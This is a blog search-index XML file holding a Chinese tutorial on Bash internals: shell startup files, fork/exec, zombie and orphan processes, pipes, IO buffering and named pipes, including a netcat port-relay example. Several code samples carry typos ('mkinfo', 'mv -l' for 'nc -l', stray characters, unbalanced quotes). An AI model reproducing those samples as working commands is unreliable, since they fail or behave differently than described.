<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bash-Shell-Kernel</title>
      <link href="/2020/05/23/bash-shell-kernel/"/>
      <url>/2020/05/23/bash-shell-kernel/</url>
      
        <content type="html"><![CDATA[<h3 id="Bash-–-Shell"><a href="#Bash-–-Shell" class="headerlink" title="Bash – Shell"></a>Bash – Shell</h3><h4 id="1-Bash-解释器"><a href="#1-Bash-解释器" class="headerlink" title="1. Bash 解释器"></a>1. Bash 解释器</h4><h5 id="1-1-一个命令的生命"><a href="#1-1-一个命令的生命" class="headerlink" title="1.1 一个命令的生命"></a>1.1 一个命令的生命</h5><ol><li>读取命令行</li><li>bash解析命令行：引号、命令替换、重定向、创建管道等 （对应于 1.2.1）</li><li>启动进程：fork()子bash进程</li><li>exec 加载程序替换fork出来的子bash进程（搜索命令路径）</li><li>命令开始执行：<ol><li>解析命令选项、参数（对应于1.2.2）</li><li>执行主代码逻辑</li><li>退出：退出状态码</li></ol></li><li>bash接收状态码，为命令子进程收尸</li></ol><h5 id="1-2-注意"><a href="#1-2-注意" class="headerlink" title="1.2 注意"></a>1.2 注意</h5><ol><li>shell需要解析的部分：特殊符号（<code>&#39;&#39; 、 &quot;&quot;  、$()、 &gt; 、 &lt; 、 |</code>）</li><li>命令自身需要解析的部分：选项、参数、特殊符号</li><li>特殊符号有可能会出现冲突，如果这个特殊符号，想要被shell解析，则不应该使用双引号、单引号包围，也不能使用反斜线转义。如果这些特殊符号想要被程序自身解析，则必须得使用引号包围，或者反斜线转义。</li></ol><pre class=" language-shell"><code class="language-shell">//例： ls  *  与  grep  “a.*”//ls  中的*代表 通配符，用来匹配文件//grep中的*代表正则表达式中的 * 的含义//所以grep中的*需要使用引号包裹起来,防止被shell的解析</code></pre><h5 id="1-3-解释器解释语句"><a href="#1-3-解释器解释语句" class="headerlink" title="1.3 解释器解释语句"></a>1.3 解释器解释语句</h5><p>解释型语言：Python 、Shell 、Perl、AWK</p><p>解释特点：</p><ul><li>读一句  解释一句  忘记一句</li><li>读一段  解释一段（函数、代码段） 忘记一段</li><li>先定义再调用</li></ul><h5 id="1-4-shell与bash的关系"><a href="#1-4-shell与bash的关系" class="headerlink" title="1.4 shell与bash的关系"></a>1.4 shell与bash的关系</h5><ol><li>shell是一门语言，bash只是其中一种</li><li>shell是一种解释器，bash只是其中一种</li><li>sh指向某种shell</li><li>除了bash之外还有csh、dash、ksh、powershell、cmd等</li></ol><h4 id="2-bash交互式、登录式"><a href="#2-bash交互式、登录式" class="headerlink" title="2. bash交互式、登录式"></a>2. bash交互式、登录式</h4><p>交互式与登录式不对立，交互式对立的是非交互式</p><h5 id="2-1-什么时候会启动bash："><a href="#2-1-什么时候会启动bash：" class="headerlink" title="2.1 什么时候会启动bash："></a>2.1 什么时候会启动bash：</h5><ol><li>登录系统时</li><li>执行命令时（内置命令除外）</li></ol><h5 id="2-2-bash配置文件"><a href="#2-2-bash配置文件" class="headerlink" title="2.2 bash配置文件"></a>2.2 bash配置文件</h5><ol><li><strong>/etc/profile</strong>（全局）</li><li>~/.bash_profile</li><li>~/.bashrc</li><li>/etc/bashrc</li><li><strong>/etc/profile.d/*.sh</strong>（全局）</li></ol><h5 id="2-3-判断交互式、登录式："><a href="#2-3-判断交互式、登录式：" class="headerlink" title="2.3 判断交互式、登录式："></a>2.3 判断交互式、登录式：</h5><ol><li><p>交互式：</p><ol><li><code>echo $-</code>：结果返回包含了字母 <code>i</code>，则为交互式  </li><li><code>echo $PS1</code>：结果返回 非空值，则为交互式，空值则为非交互式</li></ol></li><li><p>登录式：</p><p><code>shopt login_shell</code>：返回 on 则为登录式shell，返回 off 则为非登录式</p></li></ol><h5 id="2-4-常见的bash启动方式："><a href="#2-4-常见的bash启动方式：" class="headerlink" title="2.4 常见的bash启动方式："></a>2.4 常见的bash启动方式：</h5><ol><li><p>正常登录（ssh登录、虚拟终端）：交互式 &amp;&amp; 登录式</p></li><li><p><code>su</code> ：交互式  &amp;&amp; 非登录式；</p><p><code>su --login</code>（<code>su -</code>）：交互式 &amp;&amp; 登录式</p></li><li><p><code>bash</code> 命令（创建子bash）：交互式 &amp;&amp; 非登录式</p><p><code>bash --login</code> ：交互式 &amp;&amp;  登录式</p></li><li><p>ssh执行远程命令（不登录）：非交互 &amp;&amp; 非登录</p></li><li><p>shell脚本：非交互 &amp;&amp; 非登录</p><p>如果sh中加了<code>--login</code> ：非交互 &amp;&amp;  登录式</p></li><li><p>图形终端：（默认是）交互式 &amp;&amp; 非登录式，但是可以更改为登录式</p></li></ol><h5 id="2-5-bash如何读取配置文件：（不同的启动方式，读取的配置文件不同）"><a href="#2-5-bash如何读取配置文件：（不同的启动方式，读取的配置文件不同）" class="headerlink" title="2.5 bash如何读取配置文件：（不同的启动方式，读取的配置文件不同）"></a>2.5 bash如何读取配置文件：（不同的启动方式，读取的配置文件不同）</h5><ol><li><p>登录式（无论是否交互）：终端登录、带有–login的su、bash和shell脚本：<strong>读取全部文件</strong></p></li><li><p>交互式 &amp;&amp; 非登录式 ：仅读取 ~/.bashrc 、/etc/bashrc 、/etc/profile.d/*.sh</p></li><li><p>非交互 &amp;&amp; 非登录式 ：不带 –login 的脚本、（远程 shell 方式除外）：<strong>什么文件都不读取</strong></p></li><li><p>远程shell的非交互非登录：读取：~/.bashrc、 /etc/bashrc 、 /etc/profile.d/*.sh（这个会把结果定向到空）</p></li></ol><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/登录式-交互式.png" style="zoom:50%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/交互式--非登录式.png" style="zoom:50%;" /><h5 id="2-6-定义一个命令别名"><a href="#2-6-定义一个命令别名" class="headerlink" title="2.6 定义一个命令别名"></a>2.6 定义一个命令别名</h5><p>如果要定义一个命令别名，那应该定义到哪个配置文件中？</p><ol><li>如果是全局的（任何用户都可以使用），则应该定义到  /etc/profile  或  /etc/profile.d下的sh文件，若要定义在sh文件中，那么可以考虑创建一个alish.sh</li><li>如果是某个用户可用的，则建议 定义在 用户家目录下的 ~/.bash_profile和 ~/.bashrc文件中，不建议定义在 /etc/bashrc 中</li></ol><h4 id="3-进程基础"><a href="#3-进程基础" class="headerlink" title="3. 进程基础"></a>3. 进程基础</h4><p>若想深究进程，建议阅读<strong>系统编程</strong>的书籍</p><h5 id="3-1-基本概念"><a href="#3-1-基本概念" class="headerlink" title="3.1 基本概念"></a>3.1 基本概念</h5><ol><li>fork() 创建一个子进程，请求内核创建（内核将其信息保存在内核的进程表中）</li><li>子进程拷贝父进程几乎所有东西（写时复制），但共享（只读）正文段（指令）</li><li>fork后，将有两个进程分支，一个分支是子进程分支，另一个分支是原有的父进程分支</li><li>两个pid：一次调用两个返回值<ol><li>对子进程来说，fork()的返回值为0</li><li>对父进程来说，fork()的返回值为子进程的pid（进程的属性，用来标识唯一的每一个进程）</li></ol></li><li>在创建子进程之后，父子进程的调度是没有顺序保证的</li><li>子shell（子bash）与普通子进程的区别：<ol><li>子shell是一个子进程</li><li>子bash在启动时会加载配置文件完成bash环境的配置</li><li>shell是一个交互式的解释器进程，它可以继续创建交互式解释器进程</li></ol></li></ol><h5 id="3-2-伪代码演示说明"><a href="#3-2-伪代码演示说明" class="headerlink" title="3.2 伪代码演示说明"></a>3.2 伪代码演示说明</h5><p>伪代码：（不可执行）</p><pre class=" language-shell"><code class="language-shell"># she11创建子进程伪代码#创建子进程#现在有两个进程分支:新子进程和原有的父进程pid=`fork`#一次调用两个返回值#对于父进程来说，pid变量的值为新建子进程的pid（进程的属性）#对于子进程来说，pid变量的值为0# 目标# 子进程执行子进程代码# 父进程执行父进程代码# 显然，这个代码 没有这个效果# pid = 0的表示子进程分支if [[ $pid -eq 0 ]]; then    #子进程    echo "I'm Child Process"fi    #父进程/子进程都会执行echo "I'm Parent Process"</code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/进程.png" style="zoom:50%;" /><pre class=" language-shell"><code class="language-shell">#上一个代码的修改版（可实现目标）# shell 创建子进程伪代码#创建子进程#现在有两个进程分支:新的子进程和原有的父进程pid=`fork`# pid = 0的表示子进程分支if [[ $pid -eq 0I]];then    #子进程    echo "I'm child Process"else     #父进程    echo "I'm Parent Process"fi</code></pre><p> shell中的内置命令exec</p><ol><li>加载指定命令替换当前shell，执行完后退出进程</li><li>设置重定向操作，使之生效于当前shell</li></ol><h5 id="3-3-僵尸进程"><a href="#3-3-僵尸进程" class="headerlink" title="3.3 僵尸进程"></a>3.3 僵尸进程</h5><ul><li>为子进程收尸（reap）：wait()/waitpid()</li><li>孤儿进程：对shell来说，能成为孤儿的进程将脱离终端</li></ul><p>僵尸进程：</p><p>(概括：子进程消失了，父进程没有对子进程进行处理(收尸)，就会出现僵尸进程)。</p><p>每个子进程在退出时，操作系统都会保留它们的退出状态信息（包括退出想状态码和其他一些信息），并在内核维护的进程表中保留子进程项（内核还会在子进程退出的时候发送SIGCHLD信号给父进程）。对于进程的退出状态信息，只有在父进程读走之后或者收走(reap)之后才会被清除。<strong>退出状态信息没有被父进程读走的子进程将成为僵尸进程</strong>。</p><p>任何子进程，在退出的那一刻，都属于僵尸进程。一瞬间也是。</p><p>wait()/waitpid() 处理子进程退出状态信息后，子进程才从僵尸进程完全退出。</p><p>如果没有通过wait()/waitpid() 处理子进程退出状态信息，那么子进程将永远成为僵尸进程，除非父进程也退出了。（pid=1的init/systemd。会定期为僵尸进程收尸）</p><p>shell伪代码模拟僵尸进程：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 创建子进程</span><span class="token comment" spellcheck="true"># 现在有两个进程分支:新的子进程和原有的父进程</span>pid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>fork<span class="token variable">`</span></span><span class="token comment" spellcheck="true"># pid = 0的表示子进程分支</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$pid</span> -eq 0 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token comment" spellcheck="true">#子进程</span>    <span class="token keyword">echo</span> "I'm Child Process    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#父进程</span><span class="token function">sleep</span> 2<span class="token function">ps</span> -o pid, ppid, state, <span class="token function">command</span></code></pre><p>对于编程语言来说，可以使用wait()/waitpid()来收尸，他们会处理子进程的退出状态信息</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># shell伪代码</span><span class="token comment" spellcheck="true"># 创建子进程</span><span class="token comment" spellcheck="true"># 现在有两个进程分支:新的子进程和原有的父进程</span>pid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>fork<span class="token variable">`</span></span><span class="token comment" spellcheck="true"># pid = 0的表示子进程分支</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$pid</span> -eq 0 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token comment" spellcheck="true">#子进程</span>    <span class="token function">sleep</span> 1    <span class="token function">exec</span> <span class="token string">'echo "'</span>m Child Process<span class="token string">"'fi#父进程echo "</span>I'm Parent Process<span class="token string">"waitecho "</span>Chile exited or terminated"</code></pre><p>对于shell来说，无需我们手动收尸，因为在shell下执行的所有命令都是shell的子进程，shell会帮我们做好收尸工作。但是对于脱离shell的或脱离终端的进程(比如daemon类进程、nohup打开的进程)， 它们会挂在pid=1的init/systemd进程下，这些脱离shell或脱离终端的进程的子进程可能会成为永久的僵尸进程（除非它们的父进程死了，就会被系统处理）。</p><h5 id="3-4-孤儿进程"><a href="#3-4-孤儿进程" class="headerlink" title="3.4 孤儿进程"></a>3.4 孤儿进程</h5><p>父进程死了，子进程还在：子进程成为孤儿进程， 会挂靠到pid=1的init/systemd进程下。</p><p>shell伪代码模拟孤儿进程：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># she11伪代码</span><span class="token comment" spellcheck="true">#创建子进程</span><span class="token comment" spellcheck="true">#现在有两个进程分支:新的子进程和原有的父进程</span>pid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>fork<span class="token variable">`</span></span><span class="token comment" spellcheck="true"># pid = 0的表示子进程分支</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$pid</span> -eq 0 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>     <span class="token comment" spellcheck="true">#子进程</span>    <span class="token keyword">echo</span> <span class="token string">"I'm Child Process'    sleep 5    echo "</span>I<span class="token string">'m orphan Process"fi#父进程echo "I'</span>m Parent Process"<span class="token function">sleep</span> 1</code></pre><p>shell 中直接产生孤儿进程：在子shell 中执行后台命令 <code>(sleep 30 &amp;)</code>(注意带括号)</p><h4 id="4-管道"><a href="#4-管道" class="headerlink" title="4. 管道"></a>4. 管道</h4><h5 id="4-1-匿名-管道特性"><a href="#4-1-匿名-管道特性" class="headerlink" title="4.1 (匿名)管道特性"></a>4.1 (匿名)管道特性</h5><ol><li><p>进程间通信（FIFO）：数据一边进一边出（左写右读，左进右出）</p></li><li><p>管道是最先创建出来的，然后才fork管道两边的进程<img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/管道.png" style="zoom:50%;" /></p></li><li><p>管道左右两边进程没有先后顺序：<code>ps aux | grep ‘ps aux’</code>测试</p></li><li><p>开启一个进程组（<code>ps -o ppid,pid,pgid,tpgid,sid,cmd/ps j</code>）</p></li><li><p>数据传递是实时读、写的</p></li><li><p>管道是一个字节流</p><ol><li>有序性</li><li>读写任意字节大小的数据块</li></ol></li><li><p>数据写端在管道buffer满时阻塞</p><p>数据读端在管道buffer空时阻塞</p><ol><li>pipe buffermore字节为65536 字节（64k）</li><li>测试：<code>dd if=/dev/zero bs=1 | sleep 3 &amp; sleep 1 &amp;&amp; pkill -INT -x dd</code></li></ol></li></ol><h5 id="4-2-管道实例"><a href="#4-2-管道实例" class="headerlink" title="4.2 管道实例"></a>4.2 管道实例</h5><ol><li><p><strong>陷阱</strong>（作用域）： <code>echo &quot;hello&quot; | while read line;do i=$line;done</code></p><ol><li>while是bash可以认识的语句，其他的不认识</li><li>上面命令，管道右边的while语句，是在当前shell进程下，创建了一个新的子shell进程。（只要使用管道，就会创建子进程）</li><li>子shell进程的变量不会影响父shell进程。所以变量 i 只在子shell进程中有效</li><li><strong><em>如果此时再执行  echo $i  ，则输出结果为空</em></strong>。</li></ol></li><li><p>管道buffer 示例：</p><ol><li>终端1执行：<code>while true;do echo $RANDOM &gt;&gt; /tmp/a.log;sleep 1 ;done</code></li><li>终端2执行：<code>tail -f /tmp/a.log | grep &quot;[0-9]&quot;</code></li><li>终端2第二次执行：<code>tail -f /tmp/a.log | grep &quot;[0-9]&quot; | grep &quot;[0-9]&quot;</code></li><li>第3步无效果，那就试第四步：<code>tail -f /tmp/a.log | stdbuf -oL  grep &quot;[0-9]&quot; | grep &quot;[0-9]&quot;</code></li><li>解决第三步的其他方法，就是将输出定向到标准错误，此时就是直接将数据按照行缓冲模式输出到 io buffer：<code>tail -f /tmp/a.log | grep &quot;[0-9]&quot; &gt;&amp;2 | grep &quot;[0-9]&quot;</code></li></ol></li></ol><h5 id="4-3-IO-buffer-的缓冲类型"><a href="#4-3-IO-buffer-的缓冲类型" class="headerlink" title="4.3 IO buffer 的缓冲类型"></a>4.3 IO buffer 的缓冲类型</h5><ol><li>行缓冲（line buffer）：<ul><li>io buffer，当进程向io buffer中写入了一个<strong>换行符</strong>的时候，将直接刷出io buffer中的数据</li><li>当<strong>进程的输出连接至交互式终端</strong>时，使用<strong>行缓冲模式</strong></li></ul></li><li>块缓冲（block buffer/full buffer）：<ul><li>进程产生的数据先积累在io buffer中，只有积累满io buffer后，才将io buffer中的数据刷出去</li><li><strong>默认使用块缓冲模式</strong></li><li>写向文件系统文件、写向管道、写向套接字</li></ul></li><li>无缓冲（unbuffer）：<ul><li>不使用io buffer，只要进程产生数据，就立即输出。</li><li>（stderr）：错误直接输出（标准错误输出 &amp;2）</li></ul></li></ol><h5 id="4-4-IO-buffer的层次"><a href="#4-4-IO-buffer的层次" class="headerlink" title="4.4 IO buffer的层次"></a>4.4 IO buffer的层次</h5><p>注意：文件描述符是用户空间层维护的内容，不是内核维护的，因为文件描述符仅仅是一些整数变量，不需要交给内核维护。</p><p><strong>对 4.2 管道示例中 终端2 第一次执行的解析：</strong></p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/io-buffer.png" style="zoom:60%;" /><p><strong>对 4.2 管道示例中 终端2 第二次执行的解析：</strong></p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/io-buffer1.png" style="zoom:60%;" /><p><strong>对 4.2 管道示例中 终端2 第三次执行的解析：</strong></p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/io-buffer2.png" style="zoom:60%;" /><p>注意：stdbuf是创建了一个进程，-oL参数是使io buffer按照行缓冲模式处理。它上面的grep是它的子进程，共享数据，所以可以完成工作（都是缓冲模式搞的鬼。。。）</p><h5 id="4-5-IO-buffer-与-kernel-buffer-的层次"><a href="#4-5-IO-buffer-与-kernel-buffer-的层次" class="headerlink" title="4.5 IO buffer 与 kernel buffer 的层次"></a>4.5 IO buffer 与 kernel buffer 的层次</h5><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/IO-Buffer.svg" style="zoom: 50%;" /><h5 id="4-6-命名管道的特性和用法"><a href="#4-6-命名管道的特性和用法" class="headerlink" title="4.6 命名管道的特性和用法"></a>4.6 命名管道的特性和用法</h5><p>创建：<code>mkfifo</code>    </p><ol><li><p>有名称的管道，所以具有一部分匿名管道的特性</p></li><li><p>数据传输在内存中进行，所以完全没有磁盘 IO 的消耗，高效</p></li><li><p>能够协调任何进程间的通信，这是普通<code>|</code>所不具备的</p></li><li><p>任何进程(命令)都能向命名管道写入数据，同样，任何进程都能从命名管道中读取数据</p></li><li><p>命名管道的阻塞性：只有读写双方都打开了命名管道，才能读、写数据，否则读、写操作被阻塞</p></li><li><p>完全实现 “协程” coproc的功能</p></li><li><p>实现进程池的作用</p></li><li><p>还具有很多妙用，特别是结合tee、重定向以及 后台进程 的时候，用法更灵活</p></li><li><p>….</p></li><li><p>当你通过普通文件、匿名管道无法实现自己的需求的时候，请考虑使用命名管道，不会让你失望</p><p>但是，<strong>shell下绝大多数的操作都有更直观、更简便的方式来实现，所以理性使用命名管道。</strong></p></li></ol><h6 id="4-6-1-命名管道用法入门"><a href="#4-6-1-命名管道用法入门" class="headerlink" title="4.6.1  命名管道用法入门"></a>4.6.1  命名管道用法入门</h6><pre class=" language-bash"><code class="language-bash">mkinfo  /tmp/a.fifo    //创建<span class="token comment" spellcheck="true">## 终端1 </span><span class="token keyword">echo</span> <span class="token string">"hello world"</span> <span class="token operator">></span> /tmp/a.fifo   <span class="token comment" spellcheck="true">## 因读取未打开，写被阻塞</span><span class="token comment" spellcheck="true">## 终端2</span><span class="token function">cat</span> /tmp/a.fifo              <span class="token comment" spellcheck="true">## 此时 管道的读取打开，刚才的写就会解除阻塞</span><span class="token comment" spellcheck="true">## 终端1</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token function">date</span> +<span class="token string">"%T"</span> <span class="token operator">></span> /tmp/a.fifo    <span class="token function">sleep</span> 1<span class="token keyword">done</span><span class="token comment" spellcheck="true">## 终端2</span><span class="token keyword">while</span> <span class="token function">read</span> line <span class="token operator">&lt;</span> /tmp/a.fifo<span class="token punctuation">;</span><span class="token keyword">do</span>         <span class="token comment" spellcheck="true">## 有多少读多少</span>    <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token keyword">done</span><span class="token comment" spellcheck="true"># while read line;do echo $line;done &lt; /tmp/a.fifo  只读一行</span></code></pre><p>对于while的一个注意点：<strong>当需要读取源源不断的数据时，不要将数据源放在while结构的后面，而是放在读取命令（如 read）后。</strong></p><p>对于重定向操作的一个注意点：<strong>重定向操作是在命令行解析的阶段（fork子bash之前）进行的，如果重定向行为被阻塞（比如这里的命名管道），那么将一直不会创建进程。</strong></p><h6 id="4-6-2-双命名管道的妙用"><a href="#4-6-2-双命名管道的妙用" class="headerlink" title="4.6.2  双命名管道的妙用"></a>4.6.2  双命名管道的妙用</h6><p>双命名管道可以实现<code>cmd1 | cmd2 | cmd3</code> 的功能，虽然要复杂些，但是更灵活</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span> /tmp/in.fifo  /tmp/out.fifo<span class="token function">grep</span> <span class="token string">"a"</span> <span class="token operator">&lt;</span>/tmp/in.fifo  <span class="token operator">></span>/tmp/out.fifo <span class="token operator">&amp;</span><span class="token keyword">echo</span> <span class="token string">"abcde"</span>  <span class="token operator">></span>/tmp/in.fifo<span class="token function">cat</span> /tmp/out.fifo<span class="token function">rm</span> -rf /tmp/<span class="token punctuation">{</span>in,out<span class="token punctuation">}</span>.fifo</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span> /tmp/<span class="token punctuation">{</span>in,out<span class="token punctuation">}</span>.fifo<span class="token comment" spellcheck="true"># 筛选处理 cmd2进程</span><span class="token keyword">while</span> <span class="token function">grep</span> <span class="token string">':'</span> <span class="token operator">&lt;</span>/tmp/in.fifo  <span class="token operator">></span>/tmp/out.fifo<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token keyword">:</span><span class="token keyword">done</span><span class="token comment" spellcheck="true"># 上面的:代表空语句</span><span class="token comment" spellcheck="true"># 写</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token function">date</span> +<span class="token string">"%T"</span> <span class="token operator">></span>/tmp/in.fifo    <span class="token function">sleep</span> 1<span class="token keyword">done</span><span class="token comment" spellcheck="true"># 读</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token function">cat</span> /tmp/out.fifo<span class="token keyword">done</span><span class="token function">rm</span> -rf /tmp/<span class="token punctuation">{</span>in,out<span class="token punctuation">}</span>.fifo</code></pre><h6 id="4-6-3-避免临时文件导致的多余IO"><a href="#4-6-3-避免临时文件导致的多余IO" class="headerlink" title="4.6.3 避免临时文件导致的多余IO"></a>4.6.3 避免临时文件导致的多余IO</h6><p>经典的示例是 MySQL 导入 <code>.gz</code>文件</p><p>下面直接通过匿名管道导入导出数据，避免了磁盘IO，直接使用内存，更高效</p><pre class=" language-bash"><code class="language-bash">    <span class="token comment" spellcheck="true"># export：</span>mysqldump  -uXXX -pOOO db_name <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> data.gz    <span class="token comment" spellcheck="true"># import：</span><span class="token function">gzip</span> -d <span class="token operator">&lt;</span>data.gz <span class="token operator">|</span> mysql -uXXX -pOOO db_name    <span class="token comment" spellcheck="true">##但是，如果使用load data  infile呢？</span><span class="token function">mkfifo</span>  /tmp/data.sql.fifo<span class="token function">gzip</span> -d <span class="token operator">&lt;</span>data.gz <span class="token operator">></span>/tmp/data.sql.fifo <span class="token operator">&amp;</span>mysql -uXXX -pOOO -e <span class="token string">"load data infile '/tmp/data.sql.fifo' into table table_name"</span> db_name</code></pre><h6 id="4-6-4-共享终端会话"><a href="#4-6-4-共享终端会话" class="headerlink" title="4.6.4 共享终端会话"></a>4.6.4 共享终端会话</h6><pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span>  /tmp/share.fifo    <span class="token comment" spellcheck="true"># 终端1：分享端</span>script -f /tmp/share.fifo    <span class="token comment" spellcheck="true"># 终端2：接收端</span><span class="token function">cat</span>  /tmp/share.fifo<span class="token keyword">exit</span> 退出</code></pre><h6 id="4-6-5-不知道叫什么功能的功能"><a href="#4-6-5-不知道叫什么功能的功能" class="headerlink" title="4.6.5 不知道叫什么功能的功能"></a>4.6.5 不知道叫什么功能的功能</h6><pre class=" language-bash"><code class="language-bash">f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkfifo</span> p<span class="token punctuation">{</span>i,o<span class="token punctuation">}</span><span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span>    <span class="token function">tr</span> a b <span class="token operator">&lt;</span>pi1 <span class="token operator">></span>po1 <span class="token operator">&amp;</span>    <span class="token function">sed</span> <span class="token string">'s/./&amp;&amp;/g'</span> <span class="token operator">&lt;</span>pi2 <span class="token operator">></span>po2 <span class="token operator">&amp;</span>    <span class="token function">cut</span> -c2- <span class="token operator">&lt;</span>pi3 <span class="token operator">></span>po3 <span class="token operator">&amp;</span>    <span class="token function">tee</span> pi<span class="token punctuation">{</span>1,2<span class="token punctuation">}</span> <span class="token operator">></span> pi3 <span class="token operator">&amp;</span>    <span class="token function">cat</span> po<span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span>    <span class="token function">rm</span> -rf p<span class="token punctuation">{</span>i,o<span class="token punctuation">}</span><span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">printf</span> <span class="token string">'%s \n'</span> foo bar <span class="token operator">|</span> f</code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/tee.png" style="zoom:50%;" /><h6 id="4-6-6-结合nc工具做代理功能"><a href="#4-6-6-结合nc工具做代理功能" class="headerlink" title="4.6.6 结合nc工具做代理功能"></a>4.6.6 结合nc工具做代理功能</h6><p>参考： <a href="https://en.wikipedia.org/wiki/Netcat" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Netcat</a> </p><pre class=" language-bash"><code class="language-bash">nc -l 12345 <span class="token operator">|</span> nc www.baidu.com 80</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span> backpipe<span class="token function">mv</span> -l 12345 <span class="token operator">&lt;</span>backpipe <span class="token operator">|</span> nc www.baidu.com 80 <span class="token operator">></span>backpipe</code></pre><h4 id="5-shell-内置结构的陷阱"><a href="#5-shell-内置结构的陷阱" class="headerlink" title="5. shell 内置结构的陷阱"></a>5. shell 内置结构的陷阱</h4><p><strong>注意：！！！！！ 内置结构自身是属于bash的，当内置结构想要运行起来，需要有专门一个bash进程取负责执行，为他们提供运行环境。</strong></p><h5 id="5-1-while-使用管道后的变量作用域"><a href="#5-1-while-使用管道后的变量作用域" class="headerlink" title="5.1 while 使用管道后的变量作用域"></a>5.1 while 使用管道后的变量作用域</h5><p>部分讲解看  <strong>4.2 管道实例</strong>  陷阱。</p><h5 id="5-2-重定向操作是谁的？（复合命令）"><a href="#5-2-重定向操作是谁的？（复合命令）" class="headerlink" title="5.2 重定向操作是谁的？（复合命令）"></a>5.2 重定向操作是谁的？（复合命令）</h5><ol><li>输入：输入重定向放在整个while的后面  &amp;&amp;  输入重定向放在 read 后面</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span>  <span class="token operator">&lt;</span>/tmp/a.log    <span class="token comment" spellcheck="true">## 输出结果：输出一部分就结束了，中途会停止，并不会一直等待着数据</span><span class="token keyword">while</span> <span class="token function">read</span> line <span class="token operator">&lt;</span>/tmp/a.log<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span>    <span class="token comment" spellcheck="true">## 输出结果：一直会输出（按照我们想要的效果），不会中途停止</span></code></pre><ol start="2"><li>输出：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">date</span> +<span class="token string">"%T"</span><span class="token punctuation">;</span> <span class="token function">sleep</span> 1<span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">></span>/tmp/x.log    <span class="token comment" spellcheck="true">## 输出结果：</span>    <span class="token comment" spellcheck="true">#    数据会有很多，因为在整个while的后面，重定向不在循环里，所以只打开了一次文件，后面的事情就是一直向里面写数据。没有再次打开，没有被再次清空。结果显示多条数据。</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">date</span> +<span class="token string">"%T"</span> <span class="token operator">></span>/tmp/x.log<span class="token punctuation">;</span><span class="token function">sleep</span> 1<span class="token punctuation">;</span> <span class="token keyword">done</span>    <span class="token comment" spellcheck="true">## 输出结果：</span>    <span class="token comment" spellcheck="true">#    只会有一行，因为放在了循环里，所以每次都会重新打开文件，以覆盖的方式打开文件时，一瞬间，文件的内容就被清空了，然后写一次数据，再打开（清空），再写。所以只会有一条数据。</span></code></pre><p><strong>原因解释：放在bash内置结构后面的重定向，只打开一次文件</strong>（重定向没有放在循环里），覆盖/追加是在打开（open）文件的时候决定并进行的，那一刻决定了的文件的数据要不要清除。</p><h5 id="5-3-谁放入后台？"><a href="#5-3-谁放入后台？" class="headerlink" title="5.3 谁放入后台？"></a>5.3 谁放入后台？</h5><pre class=" language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">sleep</span> 100<span class="token punctuation">;</span><span class="token keyword">done</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true"># 